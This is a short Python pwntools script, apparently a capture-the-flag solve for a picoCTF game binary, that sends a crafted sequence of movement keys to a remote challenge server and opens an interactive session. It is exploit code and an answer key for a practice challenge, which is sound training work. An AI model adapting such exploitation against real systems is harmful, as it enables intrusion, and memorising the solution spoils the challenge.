#!/usr/bin/env python3

from pwn import *

elf = ELF("./game_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("saturn.picoctf.net", 53620)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    payload = flat(b'w'*4, b'd'*82, b'w', b'p')
    io.sendlineafter(b'..X', payload)

    io.interactive()

if __name__ == "__main__":
    main()
